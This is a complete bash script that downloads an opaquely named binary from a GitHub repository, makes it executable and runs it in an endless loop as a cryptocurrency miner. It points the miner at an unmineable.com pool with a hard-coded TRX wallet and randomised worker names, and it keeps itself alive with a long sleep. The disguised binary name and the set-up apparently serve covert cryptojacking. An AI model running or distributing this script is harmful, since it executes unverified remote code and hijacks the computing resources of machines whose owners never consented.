#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TJSvx6gbRV1rXqSp4CLLhKDANp5nGsb4vK
WORKER=$(echo $(shuf -i 10-40 -n 1)myrig-#krig-11q7)
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
        sleep 5
	done
sleep 999999999 
